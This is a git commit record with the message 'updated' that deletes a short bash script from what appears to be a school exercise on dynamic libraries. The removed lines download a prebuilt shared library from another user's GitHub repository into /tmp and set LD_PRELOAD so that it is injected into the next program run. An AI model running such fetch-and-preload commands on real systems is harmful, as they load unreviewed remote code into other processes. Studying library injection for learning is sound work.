308ee12a27f58f935cfb62b0172c4f02b2cb7716
theodes1 <obasam67@gmail.com>
2022-12-14 03:10:55 +0100

    updated

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget -O /tmp/code_injection.so https://github.com/MatiasMtz/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/code_injection.so
-export LD_PRELOAD=/tmp/code_injection.so
